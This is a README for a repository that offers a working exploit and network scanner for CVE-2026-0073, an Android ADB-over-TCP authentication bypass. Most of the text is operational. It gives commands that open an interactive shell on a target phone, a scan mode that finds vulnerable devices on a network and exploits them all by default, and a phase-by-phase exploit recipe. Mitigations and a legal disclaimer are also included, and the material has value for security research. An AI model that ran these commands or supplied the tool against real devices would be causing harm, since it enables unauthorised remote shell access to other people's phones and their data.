# CVE-2026-0073 — Android ADB TLS Authentication Bypass

A proof-of-concept exploit and network scanner for **CVE-2026-0073**, a critical
zero-click, no-interaction remote code execution vulnerability in Android `adbd`'s
ADB-over-TCP authentication path.

The vulnerability is a logic bug in `adbd_tls_verify_cert()` (`daemon/auth.cpp`)
where `EVP_PKEY_cmp()` is treated as a boolean predicate. When a stored RSA key
is compared against a non-RSA TLS client certificate (EC P-256 or Ed25519), the
API returns `-1` (type mismatch), which is *truthy* in C/C++. This promotes a
cross-algorithm mismatch into a successful host-key match — bypassing
authentication entirely.

**Technical details obtained  from [BARGHEST](https://barghest.asia/blog/cve-2026-0073-adb-tls-auth-bypass).**  
**Base PoC code sourced from [SecTestAnnaQuinn](https://github.com/SecTestAnnaQuinn/CVE-2026-0073-Android-adbd-authentication-bypass-POC).**  
**Patched in Android Security Bulletin — May 2026.**

---

## Impact

| Attribute | Detail |
|-----------|--------|
| **Attack vector** | Network (adjacent / proximal) |
| **Interaction** | None (zero-click) |
| **Privilege obtained** | `shell` user (uid=2000), SELinux `u:r:shell:s0` |
| **Exploit primitive** | Remote shell access via ADB |
| **CVSS** | Critical (9.8) |

From the `shell` context an attacker can inspect system properties, process
state, logs, notifications; install and remove packages; use `run-as` against
debuggable applications; and stage follow-on exploitation.

---

## Files

| File | Purpose |
|------|---------|
| `adb_tls_auth_bypass.py` | Single-target exploit PoC (original by SecTestAnnaQuinn, checksum-patched) |
| `adbt_scanner.py` | Network scanner — discover vulnerable devices + exploit them |
| `requirements.txt` | Python dependencies |

---

## Prerequisites (target device)

For the exploit to succeed, the target Android device must have:

1. **Developer options** enabled
2. **Wireless debugging** or ADB-over-TCP enabled (the platform `adbd` TCP service)
3. At least **one previously paired RSA host key** in `/data/misc/adb/adb_keys`
4. **Network reachability** to the ADB TCP port (default 5555)

This is the normal state after a developer or forensic analyst enables wireless
debugging and pairs a host. Malware (e.g., the Morpheus spyware family) has been
observed automating the enabling of precisely this device state.

---

## Setup

```bash
# Create virtual environment
uv venv

# Activate it
source .venv/bin/activate

# Install dependencies
uv pip install -r requirements.txt
```

**Dependencies:**

| Package | Used by | Required? |
|---------|---------|-----------|
| `cryptography` | Both scripts (EC cert generation, TLS) | **Yes** |
| `netifaces` | Scanner (subnet detection) | Preferred |
| `zeroconf` | Scanner (mDNS discovery) | Preferred |
| `scapy` | Scanner (ARP sweep) | Preferred |

The scanner degrades gracefully when optional packages are missing — it will
warn and fall back to alternative methods (system `ip` command, `nmap`, TCP
connect scan).

---

## Usage

### Mode 0 — Direct single-target exploit

Attack a known vulnerable device directly.

```bash
python3 adb_tls_auth_bypass.py 192.168.1.42              # interactive shell
python3 adb_tls_auth_bypass.py 192.168.1.42 5555 --cmd "id"
```

Or via the scanner:

```bash
python3 adbt_scanner.py --host 192.168.1.42                # interactive shell
python3 adbt_scanner.py --host 192.168.1.42 --cmd "id; getprop ro.product.model"
python3 adbt_scanner.py --host 192.168.1.42 --port 5580 --cmd "whoami"
```

### Mode 1 — Scan network, identify, exploit

Scan the local network for vulnerable devices and exploit all confirmed targets.

```bash
# Full scan: mDNS → ARP → port scan → ADB probe → exploit
python3 adbt_scanner.py --scan

# Run a specific command on all vulnerable devices
python3 adbt_scanner.py --scan --cmd "id; getprop ro.build.version.security_patch"

# Recon only — discover but don't exploit
python3 adbt_scanner.py --scan --no-exploit

# Scan multiple ports
python3 adbt_scanner.py --scan --ports 5555,5580,5037

# Override detected subnet (multi-homed hosts, specific ranges)
python3 adbt_scanner.py --scan --subnet 192.168.2.0/24

# Tune timeouts for slow networks
python3 adbt_scanner.py --scan --connect-timeout 5 --probe-timeout 10

# Extend mDNS listen window
python3 adbt_scanner.py --scan --mdns-timeout 60

# Skip specific discovery phases
python3 adbt_scanner.py --scan --no-mdns    # skip mDNS, ARP only
python3 adbt_scanner.py --scan --no-arp     # skip ARP, mDNS only
```

### Scanner CLI reference

```
--scan                    Scan network for vulnerable devices + exploit
--host HOST               Direct single-target exploit
--port PORT               ADB port for --host mode (default: 5555)
--cmd COMMAND             Shell command to run
-v, --verbose             Verbose logging

--mdns-timeout SECONDS    mDNS listen duration (default: 30)
--ports PORTS             Comma-separated ports in --scan mode (default: 5555)
--subnet CIDR             Override detected subnet (e.g. 192.168.2.0/24)
--connect-timeout SECONDS TCP connect timeout (default: 2.0)
--probe-timeout SECONDS   ADB probe timeout (default: 3.0)
--arp-timeout SECONDS     ARP sweep timeout (default: 3)
--no-mdns                 Skip mDNS discovery
--no-arp                  Skip ARP sweep + port scan
--no-exploit              Stop after ADB protocol probe phase
```

### Discovery pipeline

```
┌─────────────────────────────────────────────────────────────┐
│ 1. Subnet detection  — netifaces → ip route → socket trick │
│ 2. mDNS listener     — _adb-tls-connect._tcp (30s default) │
│ 3. ARP sweep         — scapy.arping → nmap -sn             │
│ 4. Port scan         — TCP connect to each host:port       │
│ 5. ADB protocol probe — send CNXN, classify response       │
│                                                             │
│    STLS   → VULNERABLE (proceed to exploit)                 │
│    AUTH   → legacy ADB auth (not this CVE)                 │
│    CNXN   → open, no auth (already accessible)             │
│    NO_ADB → not an ADB service                             │
│                                                             │
│ 6. Exploitation      — TLS upgrade → auth bypass → shell   │
└─────────────────────────────────────────────────────────────┘
```

mDNS is the most accurate identification method: when wireless debugging is
paired, Android broadcasts `_adb-tls-connect._tcp` explicitly. ARP sweep +
port scan serves as a catch-all fallback.

---

## Exploit mechanics

```
Phase 1 — cleartext ADB
  Client → CNXN(payload="host::features=...")
  Device → STLS  (upgrade to TLS required)

Phase 2 — TLS 1.3 with cross-algorithm client cert
  Client → STLS reply
  Client → TLS 1.3 handshake + EC P-256 client certificate
  Device calls adbd_tls_verify_cert():
    known_evp = RSA key from /data/misc/adb/adb_keys
    evp_pkey  = EC P-256 key from client certificate
    EVP_PKEY_cmp(known_evp, evp_pkey) → -1 (type mismatch)
    if (-1) → verified = true   ← BUG: -1 is truthy

Phase 3 — Post-TLS ADB service layer
  Client drains device CNXN (transport already online)
  No host CNXN sent (would trigger handle_new_connection kick)
  Client → OPEN(local_id, window=32MB, payload="shell:\x00")
  Device → OKAY  → shell stream established
```

---

## Threat model

### Direct network exposure
- Wireless debugging left enabled on an untrusted network (coffee shop, office,
  conference)
- Internet-exposed ADB on port 5555 (over 10,000 devices observed in Korea alone
  during exposure research)

### Malware-assisted state creation
- On-device malware uses Accessibility Service to enable Developer options,
  activate wireless debugging, and pair a host key — priming the device for
  remote exploitation by a network peer

---

## Limitations

- **Not root.** The exploit provides a `shell` (uid=2000) context. Kernel
  compromise, root access, and hardware-backed keystore keys require additional
  elevation.
- **Requires a paired key.** The target must have at least one RSA host key in
  `/data/misc/adb/adb_keys`. A freshly reset device with wireless debugging
  enabled but *never paired* is not vulnerable.
- **Requires STLS path.** Devices serving ADB over TCP via legacy (non-TLS)
  mechanisms respond with `AUTH`, not `STLS`, and are not affected by this CVE.
- **No automatic open-WiFi association.** Android does not auto-join unknown
  open WiFi networks by default. A rogue access-point attack requires either
  the target to manually join or the attacker to spoof a previously trusted
  SSID.
- **IPv4-centric ARP.** The ARP sweep fallback only discovers IPv4 hosts.
  mDNS discovery handles both IPv4 and IPv6 addresses.
- **Patched devices are immune.** The May 2026 Android Security Bulletin
  includes a fix that changes the `EVP_PKEY_cmp` check to require an exact
  `== 1` return value.

---

## Mitigation

- Apply the **May 2026 Android security update**.
- Disable Developer options when not actively needed.
- Disable wireless debugging on untrusted networks.
- Revoke unknown paired debugging hosts from Developer options.
- Do not expose ADB beyond your local trusted network.

---

## References

- [Android Security Bulletin — May 2026](https://source.android.com/docs/security/bulletin/2026/2026-05-01)
- [Technical Analysis by BARGHEST](https://barghest.asia/blog/cve-2026-0073/)
- [Android Acknowledgements](https://source.android.com/docs/security/overview/acknowledgements)
- [BoringSSL commit — EVP_PKEY_cmp return value normalization](https://boringssl.googlesource.com/boringssl/+/3975388935512ea017024973924cfaf06f5b7822)
- [Morpheus spyware report — Osservatorio Nessuno](https://osservatorionessuno.org/blog/2026/04/morpheus-a-new-spyware-linked-to-ips-intelligence/)
- [MESH — BARGHEST's Android security tool](https://github.com/BARGHEST-ngo/MESH)

---

## Disclaimer

This software is provided for **educational and authorized security research
purposes only**. The tools and code in this repository are intended to help
security professionals, researchers, and device owners:

- Understand how CVE-2026-0073 works at a protocol level
- Audit and assess their own devices and networks
- Develop and test mitigations

**You must not use this software:**

- Against any device or network you do not own or have explicit written
  permission to test
- For any unlawful purpose or in violation of applicable laws
- To access, modify, or exfiltrate data without authorization

Unauthorized access to computer systems is illegal in most jurisdictions and
may result in criminal and civil penalties. The authors and contributors
assume **no liability** for misuse, damage, or legal consequences arising from
the use of this software.

**Use responsibly. Know your target. Obtain permission.**

---

## License

[CC0 1.0 Universal](https://creativecommons.org/publicdomain/zero/1.0/) — No Rights Reserved.

To the extent possible under law, the authors have waived all copyright and
related or neighboring rights to this work.
